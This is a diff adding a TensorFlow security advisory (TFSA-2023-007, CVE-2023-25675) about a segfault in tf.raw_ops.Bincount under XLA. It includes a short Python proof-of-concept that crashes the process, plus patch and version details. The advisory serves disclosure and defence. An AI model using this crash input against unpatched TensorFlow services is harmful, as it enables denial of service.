@@ -1,0 +1,22 @@
+<h2>TFSA-2023-007: Segfault in Bincount with XLA</h2>
+<h3>CVE Number</h3>
+<p>CVE-2023-25675</p>
+<h3>Impact</h3>
+<p>When running with XLA, <code>tf.raw_ops.Bincount</code> segfaults when given a parameter <code>weights</code> that is neither the same shape as parameter <code>arr</code> nor a length-0 tensor.</p>
+<p>```python
+import tensorflow as tf</p>
+<p>func = tf.raw_ops.Bincount
+para={'arr': 6, 'size': 804, 'weights': [52, 351]}</p>
+<p>@tf.function(jit_compile=True)
+def fuzz_jit():
+ y = func(**para)
+ return y</p>
+<p>print(fuzz_jit())
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/8ae76cf085f4be26295d2ecf2081e759e04b8acf">8ae76cf085f4be26295d2ecf2081e759e04b8acf</a>.</p>
+<p>The fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by r3pwnx of 360 AIVul Team</p>
